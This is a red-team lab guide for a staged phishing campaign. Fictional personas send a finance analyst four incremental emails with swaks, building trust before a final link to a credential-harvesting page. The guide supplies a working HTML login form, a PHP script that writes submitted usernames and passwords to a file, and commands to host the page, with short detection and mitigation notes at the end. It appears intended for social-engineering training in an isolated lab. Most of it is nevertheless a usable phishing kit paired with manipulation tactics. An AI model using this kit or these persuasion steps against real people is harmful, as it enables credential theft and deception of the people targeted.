## **Law 45 — Preach the Need for Change, but Never Reform Too Much at Once**

Interpretation (offensive context):  
Do not introduce drastic or abrupt changes. Instead, **stage the attack in small, believable increments** so each step feels routine. Sudden change triggers suspicion; **gradual progression normalizes the attack**.

---

# 🎯 Attack Scenario — _Gradual Workflow Manipulation (Step-by-Step → Credential Capture)_

You slowly introduce a “process change” over multiple interactions, each step **individually harmless**, but collectively leading to compromise.

**Persona:**

> _Sophie Volnova_, 20 y/o Operations Intern

**Target:**

> _Neeraj Kulkarni_ — Finance Analyst

---

# 🔴 Red Team Objective

- Avoid:
    
    - sudden, suspicious requests
        
- Build:
    
    - gradual acceptance of new workflow
        
- Achieve:
    
    - credential capture as a “final step”
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Introduce Minor Change (Low Impact)

```bash
swaks --to neeraj@corp.local \
--from sophie.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Small update

Hi,

We’re making a few small updates to how reports are accessed—nothing major, just aligning things a bit."
```

👉 No action required  
👉 Just awareness

---

## Phase 2 — Slight Adjustment (Still Harmless)

```bash
swaks --to neeraj@corp.local \
--from sophie.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Access note

Hi,

You might notice a slightly different access page for reports starting today."
```

👉 Prepares mental model  
👉 No resistance

---

## Phase 3 — Introduce Interaction (Soft Action)

```bash
swaks --to neeraj@corp.local \
--from sophie.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick confirmation

Hi,

Just confirming everything is working on your end with the updated access."
```

👉 Still no link  
👉 Builds engagement

---

## Phase 4 — Final Step (Credential Capture)

```bash
swaks --to neeraj@corp.local \
--from sophie.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Final step

Hi,

This is the final step to complete the update:

http://192.168.56.101:8080"
```

👉 Now the action feels:

- expected
    
- normal
    
- part of process
    

---

## Phase 5 — Payload

```bash
mkdir gradual && cd gradual
```

```html
<form action="cap.php" method="POST">
<input name="user" placeholder="Email">
<input type="password" name="pass" placeholder="Password">
<button>Continue</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 6 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 7 — Execution

Target:

- already accepted earlier steps
    
- perceives final action as routine
    
- submits credentials
    

👉 Gradual change → no resistance

---

# 🛠️ Tooling + Commands

### Multi-stage delivery:

```bash
swaks --to target@corp.local --from sophie.v@corp.local
```

---

### Hosting:

```bash
php -S 0.0.0.0:8080
```

---

### Timing control:

```bash
sleep 60
```

---

### Capture:

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Gradual escalation**
    
- **Pretext layering**
    
- **Commitment & consistency bias**
    

Key principle:

> Small accepted steps lead to larger compliance

---

# 🛡️ Detection & Defensive Insight

Indicators:

- multiple benign-looking messages building toward action
    
- gradual introduction of new workflow
    
- final step involving credential input
    

Mitigation:

- monitor:
    
    - multi-stage communication patterns
        
- train users:
    
    - “Incremental change can still be malicious”
        
- enforce:
    
    - official change announcements via verified channels
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Gradual Workflow Manipulation and Incremental Trust Building

### Include:

- full message timeline
    
- escalation steps
    
- payload
    
- credential capture
    
- analysis:
    
    - how gradual change reduced suspicion
        
- impact:
    
    - high-confidence compromise
        

---

# ⚠️ Operator Insight

Sudden change:

- triggers defense
    

Gradual change:

- becomes accepted
    

You don’t force the system to change  
You **ease it into change**

---

